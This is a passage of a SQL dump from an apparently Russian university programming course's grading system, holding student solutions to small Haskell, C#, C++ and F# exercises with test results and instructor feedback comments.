(1095, 45, '2562137', '2012-09-26 20:05:30', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace CheckTable\r\n{\r\n    class Program\r\n    {\r\n        static bool AnyOdd(List<List<int>> a) {\r\n        	return a.All(x => x.Any(y => y % 2 == 1));\r\n        }\r\n        \r\n        static void Main(string[] args)\r\n        {\r\n        	/**\r\n        	 * In C#, Multidimensional arrays are not IEnumerable<int>,\r\n        	 * so methods like All() and Any() are not defined.\r\n        	 */\r\n            List<List<int>> a1 = new List<List<int>>() 	{\r\n            	new List<int> () {0, 2, 3},\r\n            	new List<int> () {2, 5, 2},\r\n            	new List<int> () {1, 5, 7}\r\n            };\r\n\r\n            List<List<int>> a2 = new List<List<int>>() 	{\r\n            	new List<int> () {4, 1, 4},\r\n            	new List<int> () {0, 0, 0},\r\n            	new List<int> () {2, 2, 2}\r\n            };\r\n\r\n            Console.WriteLine(AnyOdd(a1));\r\n            Console.WriteLine(AnyOdd(a2));\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1096, 30, '472848', '2012-09-26 21:36:27', 1, 'f n 1 = [1]\r\nf n i = if (n `mod` i == 0) then i:(f n (i - 1)) else f n (i - 1)\r\ndivisors n = f n n\r\n\r\nisRise [] 0 m = True\r\nisRise (x:s) k m = if (k == m - 1) then isRise s 0 m else (x < head s) && isRise s (k + 1) m\r\n\r\npartsKElem s [1] = False\r\npartsKElem s (k:xs) = isRise s 0 k || partsKElem s xs\r\n\r\nparts s = partsKElem s (divisors (length s))', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1097, 46, '2562137', '2012-09-27 03:27:14', 1, '#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nbool find_even(vector<int> &v) {\r\n	return find_if(v.begin(), v.end(), [] (int x) { return x % 2 == 0; }) != v.end();\r\n}\r\n\r\nint main()\r\n{\r\n	static const int a1[] = {53, 12, 45, 134, 576, 8};\r\n	vector<int> v1(a1, a1 + 6);\r\n	cout << find_even(v1) << endl;\r\n\r\n	static const int a2[] = {1, 3, 5, 7, 9};\r\n	vector<int> v2(a2, a2 + 5);\r\n	cout << find_even(v2) << endl;\r\n\r\n	static const int a3[] = {1, 3, 5, 7, 8};\r\n	vector<int> v3(a3, a3 + 5);\r\n	cout << find_even(v3) << endl;\r\n\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1098, 41, '3431532', '2012-09-27 05:40:47', 1, 'countOdd1 x = foldr (+) 0 (map (`mod` 2) x)\r\n\r\ncountOdd x  = foldr (x y -> y + x `mod` 2) 0 x', '<br/>Тесты успешно пройдены!'),
(1099, 40, '3431532', '2012-09-27 05:57:57', 1, 'frame x = createFrame x x\r\n\r\ncreateFrame 0 x = []\r\ncreateFrame x y = createLine x y y : createFrame (x-1) y\r\n\r\ncreateLine x y z | y == 0 = []\r\ncreateLine x y z | x == 1, y>0 = 1 : createLine x (y-1) z\r\ncreateLine x y z | x == z, y>0 = 1 : createLine x (y-1) z\r\ncreateLine x y z | y ==1 || y == z = 1 : createLine x (y-1) z\r\ncreateLine x y z | y > 1 && y < z  = 0 : createLine x (y-1) z', '<br/>Тесты успешно пройдены!'),
(1100, 41, '374969', '2012-09-27 06:43:40', 1, 'countOdd lst = foldr (x y -> y + mod x 2) 0 lst\r\n\r\ncountOdd1 lst = length $ filter (x -> mod x 2 == 1) lst', '<br/>Тесты успешно пройдены!'),
(1101, 34, '3607492', '2012-09-27 06:51:52', 1, 'double integral(double (*func)(double x), double x1 , double x2)\r\n{\r\n    double delta = (x2-x1)/1000;\r\n    double a = x1;\r\n    double result = 0.0;\r\n   \r\n    for (int i=0;i<1000;i++)\r\n    {\r\n     \r\n        result+=func( a + delta * (i - 0.5));\r\n\r\n    }\r\n    result*=delta;\r\n    \r\n    return (result);\r\n}\r\n\r\nint main(int argc, const char * argv[])\r\n{\r\n\r\n    // insert code here...\r\n    double z = integral([](double x){return x*(x+4)*(x-3)/(x+5);}, 0.0, 2.0);\r\n    std::cout<<"Result = "<<z;\r\n    return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1102, 46, '3607492', '2012-09-27 07:16:57', 1, 'int main(int argc, const char * argv[])\r\n{\r\n\r\n    int arr[5]={3,5,7,7,9};\r\n    bool test=false;\r\n    std::find_if(arr, arr+(sizeof(arr)/sizeof(int)), [&test](int x)->bool{if (x%2==0)test=true; return x%2==0;});\r\n       --- ОК, засчитано, но вообще проще, видимо, обойтись без test и посмотреть, что возвращает find_if\r\n    if (test)\r\n        std::cout << " YES ";\r\n    else\r\n        std::cout << " NO ";\r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1103, 31, '3431532', '2012-09-27 07:34:45', 0, '\r\nparts x = find (getNList (sublists x) 3) x\r\n\r\nfind [] y = False\r\nfind (x:xs) y | check x y == True = True\r\nfind (x:xs) y | check x y /= True = find xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (delete y x) ys\r\n\r\ndelete x (y:ys) | x == y = ys\r\ndelete x (y:ys) | x /= y = y : delete x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(1104, 31, '3431532', '2012-09-27 07:35:02', 0, '\r\nparts2 x = find (getNList (sublists x) 3) x\r\n\r\nfind [] y = False\r\nfind (x:xs) y | check x y == True = True\r\nfind (x:xs) y | check x y /= True = find xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (delete y x) ys\r\n\r\ndelete x (y:ys) | x == y = ys\r\ndelete x (y:ys) | x /= y = y : delete x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs', 'Выражение имеет неправильное значение: parts2 [1, 1]'),
(1105, 31, '3431532', '2012-09-27 07:36:51', 0, '\r\nparts2 x | length x < 2 == False\r\nparts2 x | length x == 2 = True\r\nparts2 x = find (getNList (sublists x) 3) x\r\n\r\nfind [] y = False\r\nfind (x:xs) y | check x y == True = True\r\nfind (x:xs) y | check x y /= True = find xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (delete y x) ys\r\n\r\ndelete x (y:ys) | x == y = ys\r\ndelete x (y:ys) | x /= y = y : delete x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(1106, 31, '3431532', '2012-09-27 07:37:22', 0, '\r\nparts2 x | length x < 2 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = find (getNList (sublists x) 3) x\r\n\r\nfind [] y = False\r\nfind (x:xs) y | check x y == True = True\r\nfind (x:xs) y | check x y /= True = find xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (delete y x) ys\r\n\r\ndelete x (y:ys) | x == y = ys\r\ndelete x (y:ys) | x /= y = y : delete x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs', 'Выражение имеет неправильное значение: parts2 [1,6,9]'),
(1107, 31, '3431532', '2012-09-27 07:37:57', 0, '\r\nparts2 x | length x < 2 || length x `mod` 2 == 1 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = find (getNList (sublists x) 3) x\r\n\r\nfind [] y = False\r\nfind (x:xs) y | check x y == True = True\r\nfind (x:xs) y | check x y /= True = find xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (delete y x) ys\r\n\r\ndelete x (y:ys) | x == y = ys\r\ndelete x (y:ys) | x /= y = y : delete x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs', 'Выражение имеет неправильное значение: parts2 [5,1,2,3, 7,8,9,10,11,12,13,6,20,14,15,16]'),
(1108, 31, '3431532', '2012-09-27 07:40:37', 2, ' \r\nparts2 x | length x < 2 || length x `mod` 2 == 1 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = find (getNList (sublists x) ((length x)`div` 2)) x\r\n\r\nfind [] y = False\r\nfind (x:xs) y | check x y == True = True\r\nfind (x:xs) y | check x y /= True = find xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (delete y x) ys\r\n\r\ndelete x (y:ys) | x == y = ys\r\ndelete x (y:ys) | x /= y = y : delete x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs\r\n  --- OK, вообще идея хорошая, но давайте я вас попрошу немного изменить sublists, чтобы subslists \r\n  --- генерировала только _возрастающие_ подпоследовательности исходной последовательности. \r\n  --- Это несложно, а разница в эффективности будет, видимо, существенной. ', '<br/>Тесты успешно пройдены!'),
(1109, 31, '3431532', '2012-09-27 08:15:01', 0, 'import Data.List \r\n \r\nparts2 x | length x < 2 || length x `mod` 2 == 1 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = findd (getNList (sublists (sort x)) ((length x)`div` 2)) x\r\n\r\nfindd [] y = False\r\nfindd (x:xs) y | check x y == True = True\r\nfindd (x:xs) y | check x y /= True = findd xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (deletee y x) ys\r\n\r\ndeletee x (y:ys) | x == y = ys\r\ndeletee x (y:ys) | x /= y = y : deletee x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs] ++ sublists xs', 'Выражение имеет неправильное значение: parts2 [5,1,2,3, 7,8,9,10,11,12,13,6,20,14,15,16]'),
(1110, 31, '3431532', '2012-09-27 09:21:20', 2, 'parts2 x | length x < 2 || length x `mod` 2 == 1 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = findd (getNList (sublists x) ((length x)`div` 2)) x\r\n\r\nfindd [] y = False\r\nfindd (x:xs) y | check x y == True = True\r\nfindd (x:xs) y | check x y /= True = findd xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n   --- Если у нас в списке возрастаюшие последовательности, то ccheckorder для x вызывать уже не надо, \r\n   --- только для всего остального\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (deletee y x) ys\r\n\r\ndeletee x (y:ys) | x == y = ys\r\ndeletee x (y:ys) | x /= y = y : deletee x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs, checkOrder sublist == True] ++ sublists xs\r\n    --- Тут на самом деле нет смысла вызывать checkorder subslist, ведь subslist точно должна быть водрастающей,\r\n    --- потому что sublist - это элемент sublists xs, а он должен порождать только возрастающие последовательости,\r\n    --- по крайней мере, мы к этому стремимся.\r\n    --- тут надо проверить только, что x не испортит это свойство, последовательность по \r\n    --- прежнему будет возрастающей. Исправьте, пожалуйста. (Если не очень понятно, о чем речь, напишите,\r\n    --- я поясню)  ', '<br/>Тесты успешно пройдены!'),
(1111, 31, '3431532', '2012-09-27 09:36:31', 0, '\r\nparts2 x | length x < 2 || length x `mod` 2 == 1 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = findd (getNList (sublists x) ((length x)`div` 2)) x\r\n\r\nfindd [] y = False\r\nfindd (x:xs) y | check x y == True = True\r\nfindd (x:xs) y | check x y /= True = findd xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (deletee y x) ys\r\n\r\ndeletee x (y:ys) | x == y = ys\r\ndeletee x (y:ys) | x /= y = y : deletee x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs, length sublist == 0 || x<(head sublist)] ++ sublists xs', '<br/>Тесты успешно пройдены!'),
(1112, 43, '374969', '2012-09-27 11:05:15', 2, '-- Поднял рещение за прошлый год\r\n--static member task01 a b =\r\n--        let rec helpFun a b =\r\n--            match b with\r\n--            |0     -> new ArgumentException("НОД чисел не равен 1") |> raise\r\n--            |1     -> 1, 1 - a\r\n--            |_     -> let fs, sn = helpFun b (a / b)\r\n--                      sn, fs - (a % b)*sn\r\n--        helpFun a b\r\neuclid a 1 = (1, 1-a)\r\neuclid a b = (sn, fs - (mod a b) * sn)\r\n                where (fs, sn) = euclid b (div a b)\r\n   --- Видимо я вам в прошдом году зря зачел:) (что обяснимо, иногда мне было лень запускать F# и я прнимал на гдаз)\r\n   --- В принципе идая конечно правильная, но у вас есть (и было) не совсем правильно написано, посмотрите \r\n   --- внимательно, пожалуйста.', 'Не удалось вычислить выражение "let (x,y) = euclid 3 5 in 3*x+5*y", проверьте правильность синтаксиса'),
(1113, 31, '3431532', '2012-09-27 11:42:47', 0, 'parts2 x | length x < 2 || length x `mod` 2 == 1 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = findd (getNList (sublists x) ((length x)`div` 2)) x\r\n\r\nfindd [] y = False\r\nfindd (x:xs) y | check x y == True = True\r\nfindd (x:xs) y | check x y /= True = findd xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (deletee y x) ys\r\n\r\ndeletee x (y:ys) | x == y = ys\r\ndeletee x (y:ys) | x /= y = y : deletee x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs, length sublist == 0 || x<(head sublist)] ++ sublists xs', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(1114, 31, '3431532', '2012-09-27 11:43:16', 1, 'parts2 x | length x < 2 || length x `mod` 2 == 1 = False\r\nparts2 x | length x == 2 = True\r\nparts2 x = findd (getNList (sublists x) ((length x)`div` 2)) x\r\n\r\nfindd [] y = False\r\nfindd (x:xs) y | check x y == True = True\r\nfindd (x:xs) y | check x y /= True = findd xs y\r\n\r\ncheck x y = checkOrder x && checkOrder (rml y x)\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) | x<y = checkOrder (y:xs)\r\ncheckOrder (x:y:xs) | x>=y = False\r\n\r\nrml [] _ = []\r\nrml x [] = x\r\nrml x (y:ys) = rml (deletee y x) ys\r\n\r\ndeletee x (y:ys) | x == y = ys\r\ndeletee x (y:ys) | x /= y = y : deletee x ys\r\n\r\ngetNList [] n = []\r\ngetNList (x:xs) n | length x == n = x : getNList xs n\r\ngetNList (x:xs) n | length x /= n = getNList xs n\r\n\r\n\r\nsublists [] = [[]]\r\nsublists (x:xs) = [x:sublist | sublist <- sublists xs, length sublist == 0 || x<(head sublist)] ++ sublists xs', '<br/>Тесты успешно пройдены!'),
(1115, 34, '3431532', '2012-09-27 12:14:53', 2, 'double integral(double (*f)(double), int a, int b)\r\n{\r\n    double step = (b-a)/10000.0f, answer = 0.0f;\r\n    for(int i=0;i<10000;i++)\r\n        answer += f(a+step*i)*step;\r\n    return answer;\r\n}\r\n   --- Нет, во первых тут еще нужен пример вызова, и во вторых надо чтобы это раьотло и для лямбда выражений', '<br/>Тесты успешно пройдены!'),
(1116, 43, '374969', '2012-09-27 12:36:49', 0, '-- Поднял рещение за прошлый год\r\n--static member task01 a b =\r\n--        let rec helpFun a b =\r\n--            match b with\r\n--            |0     -> new ArgumentException("НОД чисел не равен 1") |> raise\r\n--            |1     -> 1, 1 - a\r\n--            |_     -> let fs, sn = helpFun b (a / b)\r\n--                      sn, fs - (a % b)*sn\r\n--        helpFun a b\r\neuclid a 1 = (1, 1-a)\r\neuclid a b = (sn, fs - (div a b) * sn)\r\n                where (fs, sn) = euclid b (mod a b)', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1117, 43, '374969', '2012-09-27 12:39:55', 1, '-- Поднял рещение за прошлый год\r\n--static member task01 a b =\r\n--        let rec helpFun a b =\r\n--            match b with\r\n--            |0     -> new ArgumentException("НОД чисел не равен 1") |> raise\r\n--            |1     -> 1, 1 - a\r\n--            |_     -> let fs, sn = helpFun b (a / b)\r\n--                      sn, fs - (a % b)*sn\r\n--        helpFun a b\r\n\r\n--Видимо в прошлом году тесты на эту задачу я не писал, почему и перепутал / и %\r\neuclid 1 0 = (1, 1)\r\neuclid a 1 = (1, 1-a)\r\neuclid a b = (sn, fs - (div a b) * sn)\r\n                where (fs, sn) = euclid b (mod a b);', '<br/>Тесты успешно пройдены!'),
(1118, 35, '82873297', '2012-09-27 12:42:42', 1, 'isosc x y z = iseq (dist3 [x,y,z])\r\n\r\n\r\n\r\niseq [x,y,z] | (x==y) || (y==z) || (z==x) = True\r\n\r\n             | otherwise                  = False\r\n\r\n\r\n\r\ndist3 [x,y,z] = [(dist x y),(dist y z),(dist z x)]\r\n\r\n\r\n\r\ndist x y = sqrt ((fst x - fst y)^2 + (snd x - snd y)^2)  \r\n', '<br/>Тесты успешно пройдены!'),
(1119, 36, '82873297', '2012-09-27 12:43:34', 1, 'cubeTable n = map (i -> (i,i*i*i)) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1120, 37, '82873297', '2012-09-27 12:43:55', 1, 'minsum (x1:xs) = minimum(map(x->(fst x)+(snd x)) (zip (x1:xs) xs))\r\n', '<br/>Тесты успешно пройдены!'),
(1121, 40, '82873297', '2012-09-27 12:44:20', 1, 'frame 1 = [[1]]\r\n\r\nframe n = frame1 n 1 [map(x -> 1)[1..n]]\r\n\r\n\r\n\r\nframe1 n x xss | (n == (x + 1)) = ((last xss):xss)\r\n\r\nframe1 n 1 xss  = frame1 n 2 (([1] ++ map(x -> 0)[1..(n-2)] ++ [1]):xss)\r\n\r\nframe1 n x (xs:xss) = frame1 n (x+1) (xs:(xs:xss))\r\n', '<br/>Тесты успешно пройдены!'),
(1122, 41, '82873297', '2012-09-27 12:44:49', 1, 'countOdd xs = foldr (x s -> if ((mod x 2) == 1) then s+1 else s) 0 xs\r\n\r\n\r\n\r\ncountOdd1 xs = sum (map(x -> mod x 2) xs)\r\n', '<br/>Тесты успешно пройдены!'),
(1123, 42, '82873297', '2012-09-27 12:45:15', 1, 'myfoldl f e [] = e\r\n\r\nmyfoldl f e (x:xs) = myfoldl f (f e x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(1124, 34, '3431532', '2012-09-27 13:04:27', 1, 'double integral(double (*f)(double x), int a, int b)\r\n{\r\n    double step = (b-a)/10000.0f, answer = 0.0f;\r\n    for(int i=0;i<10000;i++)\r\n        answer += f(a+step*i)*step;\r\n    return answer;\r\n}\r\n\r\nint main(int argc, const char * argv[])\r\n{\r\n    double t = integral([](double x){return x*x;},0,1);\r\n    std::cout<<t;\r\n    return 0;\r\n}\r\n   --- Алексей, вы соваршенно не обязаны сдаваит эту задачу, но если сдаете, пришлите пожалуйста\r\n   --- решение, которое ms компилировалось, (с #include и т.д.)\r\n   --- И пожалуйста. присылайте решение только после того, как вы его дествительно скомпилируете без ошибок', '<br/>Тесты успешно пройдены!'),
(1125, 46, '3431532', '2012-09-27 13:30:57', 1, 'const int arrsize = 2;\r\n\r\nint* find_using(int lst[])\r\n{\r\n    \r\n    return std::find_if(lst, lst + arrsize, [](int x){ return !(x%2);});\r\n}\r\n\r\n\r\n\r\nint main(int argc, const char * argv[])\r\n{\r\n    int arr[arrsize] = {11,21};\r\n    \r\n    int *location = find_using(arr);\r\n    \r\n    if(location != arr+arrsize)\r\n        std::cout<<*location;\r\n    else\r\n        std::cout<<"not found";\r\n    return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1126, 45, '3431532', '2012-09-27 15:48:41', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.IO;\r\nusing System.Text;\r\nusing MoonAPNS;\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static List<List<int>> list = new List<List<int>>();\r\n        static void Main(string[] args)\r\n        {\r\n            List<int> lst = new List<int>();\r\n            List<int> lst1 = new List<int>();\r\n            lst.Add(1); lst.Add(1); lst.Add(3); lst.Add(6);\r\n            lst1.Add(1); lst1.Add(1); lst1.Add(3); lst1.Add(4);\r\n\r\n            list.Add(lst); list.Add(lst);\r\n\r\n            Console.Write(list.All(x => x.Any(y => y % 2 == 0)));\r\n        }\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1127, 33, '3431532', '2012-09-27 16:00:26', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.IO;\r\nusing System.Text;\r\nusing MoonAPNS;\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static List<List<int>> list = new List<List<int>>();\r\n\r\n        static double integral(Func<double, double> f, double a, double b)\r\n        {\r\n            double step = (b-a)/10000, answer = 0.0;\r\n            \r\n            for(int i=0;i<10000;i++)\r\n            {\r\n                answer += f(a + i * step) * step;\r\n            }\r\n            return answer;\r\n        }\r\n\r\n        static double xx(double x){ return x*x;}\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Console.Write(integral(x => x*x, 0, 1));\r\n        }\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1128, 36, '44060', '2012-09-28 06:19:52', 1, 'cubeTable n = map (x -> (x, x*x*x))[1..n]', '<br/>Тесты успешно пройдены!'),
(1129, 31, '4837959', '2012-09-28 07:41:43', 1, 'parts2 xs = p xs (length xs) 0 0 [] []\r\n\r\n\r\n\r\np [] _ len1 len2 _ _\r\n\r\n    | len1 == len2 = True\r\n\r\n    | otherwise = False\r\n\r\np (x:xs) lenx len1 len2 l1 l2 \r\n\r\n    | max len1 len2 > div lenx 2 = False\r\n\r\n    | otherwise = ((l1 == [] || x > head l1) && p xs lenx (len1 + 1) len2 (x:l1) l2) ||\r\n\r\n                  ((l2 == [] || x > head l2) && p xs lenx len1 (len2 + 1) l1 (x:l2))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1130, 46, 'Deutsche', '2012-09-28 09:19:49', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(1131, 31, '12206137', '2012-09-28 11:53:40', 1, '  --- Ну, честно сказать, я не совсем все понял, по вроде правильно, замечательно..\r\n-- This solution, if correct, must have a performance O(n * sqrt(n))\r\n\r\n-- It''s reduced to special case of knapsack problem (and it''s solving is the most inefficient place in algorithm)\r\n\r\n-- Of course, if sort is O(n log n)-time\r\n\r\n-- (It''s possible not to use it, but I don''t know how to count an elements without mutable arrays)\r\n\r\n-- For knapsack: idea from here http://habrahabr.ru/post/93698/ is used, item 4.\r\n\r\n-- There are not more then sqrt(n) different numbers, giving n in sum.\r\n\r\n\r\n\r\nimport Data.Bits\r\n\r\nimport Data.Array\r\n\r\nimport Data.List\r\n\r\n\r\n\r\n(|>) x f = f x\r\n\r\n\r\n\r\ndata StackElem = Line Int | Fork [Int] [Int] deriving Show\r\n\r\n\r\n\r\nreduceStack val acc [] = Just $ [Fork (reverse acc) [val]]\r\n\r\n\r\n\r\nreduceStack val acc (Line x:rem)\r\n\r\n    | x < val = Just $ (Fork (reverse acc) [val]) : Line x : rem\r\n\r\n    | otherwise = reduceStack val (x:acc) rem\r\n\r\n\r\n\r\nreduceStack val acc (elem@(Fork (ts@(t:top)) (bs@(b:bot))) : rem)\r\n\r\n    | t < val = Just $ (Fork (reverse acc) [val]) : elem : rem\r\n\r\n    | val <= b = Nothing\r\n\r\n    | otherwise = Just $ Fork ((reverse acc) ++ ts) (val:bs) : rem\r\n\r\n\r\n\r\ngenStack acc [] = acc\r\n\r\ngenStack Nothing _ = Nothing\r\n\r\ngenStack (Just []) (x:xs) = genStack (Just [Line x]) xs\r\n\r\ngenStack (Just (top:as)) (x:xs) =\r\n\r\n    let\r\n\r\n    newAcc = \r\n\r\n        case top of\r\n\r\n            Line t ->\r\n\r\n                if t < x then Just $ Line x : top : as\r\n\r\n                else reduceStack x [t] as\r\n\r\n            Fork (ts@(t:_)) (bs@(b:_))\r\n\r\n                | t < x -> Just $ (Line x) : top : as\r\n\r\n                | x <= b -> Nothing\r\n\r\n                | otherwise -> Just $ Fork ts (x:bs) : as\r\n\r\n    in\r\n\r\n    genStack newAcc xs\r\n\r\n\r\n\r\ncollectCounts :: ([Int], Int, Int) -> StackElem -> ([Int], Int, Int)\r\n\r\ncollectCounts (nums,h,n) (Line cur) = (nums, h+1, n+1)\r\n\r\ncollectCounts (nums, h, n) (Fork top bot) =\r\n\r\n    let dif = abs $ length top - length bot in\r\n\r\n    if dif == 0 then (nums, h, n)\r\n\r\n    else (dif:nums, h, n+dif)\r\n\r\n\r\n\r\nget2Powers :: [Int] -> (Int, Int) -> [Int]\r\n\r\nget2Powers acc (x,c)\r\n\r\n    | c == 0 = acc\r\n\r\n    | c .&. 1 == 1 = get2Powers (x : acc) (x, shiftR c 1)\r\n\r\n    | otherwise = get2Powers acc (x, shiftR c 1)\r\n\r\n\r\n\r\nappendSums sums add =\r\n\r\n    let (l,r) = bounds sums in\r\n\r\n    array (0, r+add) [(i, (i <= r) && sums!i || (i >= add) && sums!(i-add)) | i <- [0..r+add]]\r\n\r\n\r\n\r\nparts2 x =\r\n\r\n    case genStack (Just []) x of\r\n\r\n        Nothing -> False\r\n\r\n        Just stack ->\r\n\r\n            let (nums, h, n) = stack |> foldl collectCounts ([],0,0) in\r\n\r\n            if n `mod` 2 /= 0 then False\r\n\r\n            else if length nums == 0 then True\r\n\r\n            else\r\n\r\n                let (n'':nums'') = sort nums in\r\n\r\n                